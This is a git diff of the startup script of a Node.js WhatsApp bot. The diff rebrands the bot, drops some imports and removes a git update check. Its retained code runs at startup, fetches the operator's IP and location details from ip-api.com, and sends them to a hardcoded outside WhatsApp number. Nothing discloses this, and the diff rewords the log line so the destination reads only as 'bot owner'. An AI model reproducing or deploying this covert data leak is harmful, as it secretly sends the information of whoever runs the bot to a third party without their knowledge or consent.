@@ -22,10 +22,6 @@ const
 const simple  = require('./lib/simple.js');
 const WAConnection = simple.WAConnection(_WAConnection);
 
-const exec = require('child_process').exec;
-const Heroku = require('heroku-client');
-const { PassThrough } = require('stream');
-const git = simpleGit();
 const fs = require('fs')
 const figlet = require('figlet')
 const moment = require('moment-timezone')
@@ -34,13 +30,14 @@ const fetch = require('node-fetch')
 const { spawn, exec, execSync } = require("child_process")
 const { wait,simih,getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
 
+
 const { color } = require('./lib/color')
 const clc = require('chalk')
 const setting = JSON.parse(fs.readFileSync('./settings.json'))
 const { version, bugs } = require('./package.json')
 
 //ngak penting tapi jangan lu hapus
-    const banner=cfonts["render"](("Abhi         Mowl"),{font:"block",color:"white",align:"center",gradient:["red","yellow"],lineHeight:2})
+    const banner=cfonts["render"](("Queen          Alexa"),{font:"block",color:"white",align:"center",gradient:["red","yellow"],lineHeight:2})
 
 const starts = async (hyper = new WAConnection()) => {
 
@@ -49,14 +46,14 @@ const starts = async (hyper = new WAConnection()) => {
   
     hyper.logger.level = 'warn'
     hyper.version = [2, 2143, 3] 
-    hyper.browserDescription = ["Abhi Mowl", "Safari", "3.0"];
+    hyper.browserDescription = ["Queen Alexa", "Safari", "3.0"];
 
     hyper.on('qr', () => {
         console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr, bro, make WhatsApp 👍 '))
     })
     console.log()
     fs.existsSync('./session.json') && hyper.loadAuthInfo('./session.json')
-    console.log(color('|WRN|', 'yellow'), color('Sending bot info to Ajay-o-s', 'cyan'))
+    console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
        hyper.sendMessage("917510153501@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
@@ -76,13 +73,6 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
         };
 	hyper.sendMessage("917510153501@s.whatsapp.net", { buttonsMessage },{}, MessageType.text, {contextInfo: { externalAdReply:{title: "Developer Abhi-Mwol",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.jpeg'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
 	console.log(color('|WRN|', 'yellow'), color('buttion message sented', 'cyan'))
-	console.log(color('|WRN|', 'yellow'), color('cheching update', 'cyan'))
-        await git.fetch();
-        var commits = await git.log(['main' + '..origin/' + 'main']);
-	if (commits.total === 0) {
-		 hyper.sendMessage("917510153501@s.whatsapp.net", `─────「 *Abhi-Mwol* 」─────\n\n*_NO UPDATE_*\n────────────────────`, MessageType.text, {contextInfo: { externalAdReply:{title: "Developer Abhi-Mwol",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.jpeg'),sourceUrl:"https://wa.me/917510153501?text=update520now"}}})
-	console.log(color('|WRN|', 'yellow'), color('no update', 'cyan'))
-	}
    })
     hyper.on('connecting', () => {
     console.log()
